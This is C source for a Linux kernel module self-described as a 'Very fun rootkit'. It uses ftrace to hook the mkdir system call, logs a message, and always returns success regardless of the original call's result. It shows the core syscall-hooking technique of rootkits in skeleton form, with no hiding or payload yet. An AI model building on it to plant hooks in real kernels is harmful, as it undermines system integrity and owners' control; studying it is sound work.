#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include "hook.c"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

static asmlinkage long (*orig_mkdir)(const struct pt_regs *regs);

static asmlinkage long hook_mkdir(const struct pt_regs *regs) {
    printk(KERN_INFO "Hooked mkdir! :D\n");
    orig_mkdir(regs);
    return 0;
}


// List of system calls to hook :D
struct rooti_ftrace_hook hooks[] = {
    ROOTI_HOOK("sys_mkdir", hook_mkdir, &orig_mkdir)
};


/* LKM initialization */
static int __init rooti_init(void)
{
    printk(KERN_INFO "rooti: init\n");
    
    int ret = rooti_hooking_init();
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_hooking_init() failed: %d\n", ret);
        return ret;
    }

    // Install hooks :D
    ret = rooti_install_hooks(hooks, 1);
    if (ret < 0) {
        printk(KERN_DEBUG "rooti: rooti_install_hooks() failed: %d\n", ret);
        return ret;
    }

    return 0;
}

/* LKM cleanup */
static void __exit rooti_exit(void)
{
    printk(KERN_INFO "rooti: exit\n");
    rooti_uninstall_hooks(hooks, 1);
}

module_init(rooti_init);
module_exit(rooti_exit);
